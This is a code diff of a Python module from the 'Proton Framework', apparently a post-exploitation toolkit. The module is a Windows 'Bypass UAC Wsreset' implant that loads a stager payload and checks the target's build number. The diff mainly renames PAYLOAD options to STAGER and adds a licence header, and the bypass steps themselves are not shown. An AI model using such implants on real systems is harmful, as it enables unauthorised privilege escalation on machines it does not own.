@@ -1,12 +1,32 @@
+#!/usr/bin/env python3
+
+#            ---------------------------------------------------
+#                             Proton Framework              
+#            ---------------------------------------------------
+#                Copyright (C) <2019-2020>  <Entynetproject>
+#
+#        This program is free software: you can redistribute it and/or modify
+#        it under the terms of the GNU General Public License as published by
+#        the Free Software Foundation, either version 3 of the License, or
+#        any later version.
+#
+#        This program is distributed in the hope that it will be useful,
+#        but WITHOUT ANY WARRANTY; without even the implied warranty of
+#        MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
+#        GNU General Public License for more details.
+#
+#        You should have received a copy of the GNU General Public License
+#        along with this program.  If not, see <http://www.gnu.org/licenses/>.
+
 import core.job
 import core.implant
 import uuid
 
 class WsResetJob(core.job.Job):
     def create(self):
-        id = self.options.get("PAYLOAD")
+        id = self.options.get("STAGER")
         payload = self.load_payload(id)
-        self.options.set("PAYLOAD_DATA", payload)
+        self.options.set("STAGER_DATA", payload)
         if self.session_id == -1:
             return
         if int(self.session.build) < 17134 and self.options.get("IGNOREBUILD") == "false":
@@ -21,24 +41,24 @@ class WsResetJob(core.job.Job):
 
 class WsResetImplant(core.implant.Implant):
 
-    NAME = "Bypass UAC  Wsreset"
+    NAME = "Bypass UAC Wsreset"
     DESCRIPTION = "UAC bypass Fileless - Wsreset bypass UAC."
     AUTHORS = ["Entynetproject"]
     STATE = "implant/elevate/bypassuac_wsreset"
 
     def load(self):
-        self.options.register("PAYLOAD", "", "Run listeners for a list of IDs.")
-        self.options.register("PAYLOAD_DATA", "", "The actual data.", hidden=True)
+        self.options.register("STAGER", "", "Run stagers for a list of IDs.")
+        self.options.register("STAGER_DATA", "", "The actual data.", hidden=True)
 
     def job(self):
         return WsResetJob
 
     def run(self):
-        id = self.options.get("PAYLOAD")
+        id = self.options.get("STAGER")
         payload = self.load_payload(id)
 
         if payload is None:
-            self.shell.print_error("Payload is not found.")
+            self.shell.print_error("Stager is not found.")
             return
 
         workloads = {}
